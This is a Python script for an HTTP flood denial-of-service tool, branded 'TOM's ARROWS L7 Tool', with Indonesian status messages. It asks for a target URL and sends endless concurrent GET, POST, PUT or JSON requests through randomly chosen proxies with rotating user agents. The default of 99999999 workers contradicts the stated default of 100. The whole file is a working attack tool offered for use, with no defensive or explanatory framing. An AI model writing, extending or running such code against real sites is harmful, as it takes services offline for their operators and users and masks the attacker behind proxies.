import asyncio
import aiohttp
import random
import time
from aiohttp import ClientTimeout
from colorama import Fore, Style, init
import os
import sys
init(autoreset=True)

# === Logo ===
os.system('cls' if os.name == 'nt' else 'clear')
LOGO = f"""
{Fore.YELLOW}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════╗
║ {Fore.RED}{Style.BRIGHT}████████╗ ██████╗ ███╗   ███╗███████╗                           {Fore.YELLOW} ║
║ {Fore.RED}{Style.BRIGHT}╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝    {Fore.YELLOW}{Style.BRIGHT}══> {Fore.GREEN}{Style.BRIGHT}[ {Fore.BLUE}{Style.BRIGHT} AUTHOR TOM26x{Fore.GREEN}{Style.BRIGHT}]  {Fore.YELLOW} ║
║ {Fore.RED}{Style.BRIGHT}   ██║   ██║   ██║██╔████╔██║███████╗    {Fore.YELLOW}{Style.BRIGHT}══> {Fore.GREEN}{Style.BRIGHT}[ {Fore.BLUE}{Style.BRIGHT}HTTP Flood    {Fore.GREEN}{Style.BRIGHT}]  {Fore.YELLOW} ║
║ {Fore.WHITE}{Style.BRIGHT}   ██║   ██║   ██║██║╚██╔╝██║╚════██║    {Fore.YELLOW}{Style.BRIGHT}══> {Fore.GREEN}{Style.BRIGHT}[ {Fore.BLUE}{Style.BRIGHT}LAYER 7       {Fore.GREEN}{Style.BRIGHT}]  {Fore.YELLOW} ║
║ {Fore.WHITE}{Style.BRIGHT}   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║    {Fore.YELLOW}{Style.BRIGHT}══> {Fore.GREEN}{Style.BRIGHT}[ {Fore.BLUE}{Style.BRIGHT}VERSION 1     {Fore.GREEN}{Style.BRIGHT}]  {Fore.YELLOW} ║
║ {Fore.WHITE}{Style.BRIGHT}   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝                           {Fore.YELLOW} ║
║                {Fore.RED}ARROWS                                           {Fore.YELLOW} ║
╚══════════════════════════════════════════════════════════════════╝
{Fore.BLUE}{Style.BRIGHT}              TOM's ARROWS L7 Tool by TOMCAT26x"""

# Load user agents
with open("UA.txt", "r") as f:
    user_agents = [line.strip() for line in f if line.strip()]

# Load proxies
with open("proxy.txt", "r") as f:
    proxies = [line.strip() for line in f if line.strip()]

success = 0
failed = 0

def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

async def attack(session, url, method, payload=None):
    global success, failed
    try:
        proxy = random.choice(proxies)
        if not proxy.startswith("http"):
            proxy = "http://" + proxy
        headers = get_headers()

        if method == "GET":
            async with session.get(url, headers=headers, proxy=proxy, timeout=ClientTimeout(total=10)) as r:
                await r.read()
        elif method == "POST":
            async with session.post(url, headers=headers, proxy=proxy, data=payload, timeout=ClientTimeout(total=10)) as r:
                await r.read()
        elif method == "PUT":
            async with session.put(url, headers=headers, proxy=proxy, data=payload, timeout=ClientTimeout(total=10)) as r:
                await r.read()
        elif method == "JSON":
            async with session.post(url, headers=headers, proxy=proxy, json=payload, timeout=ClientTimeout(total=10)) as r:
                await r.read()

        success += 1
    except Exception:
        failed += 1

async def runner(url, method, payload, workers):
    conn = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [attack_loop(session, url, method, payload) for _ in range(workers)]
        await asyncio.gather(*tasks)

async def attack_loop(session, url, method, payload):
    while True:
        await attack(session, url, method, payload)

async def logger():
    global success, failed
    while True:
        print(
            f"{Fore.GREEN}[+] Sukses: {success} "
            f"{Fore.RED}| [-] Gagal: {failed} "
            f"{Fore.YELLOW}| {time.strftime('%H:%M:%S')}", end="\r"
        )
        await asyncio.sleep(1)

async def main():
    print(LOGO)
    url = input(f"{Fore.CYAN}Target URL (with http/https): ").strip()
    print(f"{Fore.CYAN}Method options: GET, POST, PUT, JSON")
    method = input("Choose method: ").strip().upper()
    payload = None
    if method in ["POST", "PUT", "JSON"]:
        payload = input("Payload (optional): ") or "{}"

    workers = int(input("Concurrent workers (default 100): ") or "99999999")

    tasks = [runner(url, method, payload, workers), logger()]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dihentikan oleh pengguna.")
